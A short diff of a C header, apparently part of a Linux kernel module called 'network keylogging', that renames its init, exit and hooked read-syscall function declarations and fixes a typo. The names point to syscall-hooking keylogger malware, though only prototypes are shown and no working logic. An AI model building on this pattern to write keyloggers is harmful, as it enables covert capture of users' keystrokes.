@@ -26,9 +26,9 @@
 
 
 /* Declaration of functions */
-static int network_keylogging_init(int);
-static int network_keyloggin_exit(void);
+int network_keylogging_init(int);
+int network_keylogging_exit(void);
 
-asmlinkage long my_read_syscall(unsigned int, char __user *, size_t);
+asmlinkage long network_keylogging_read_syscall(unsigned int, char __user *, size_t);
 
 #endif
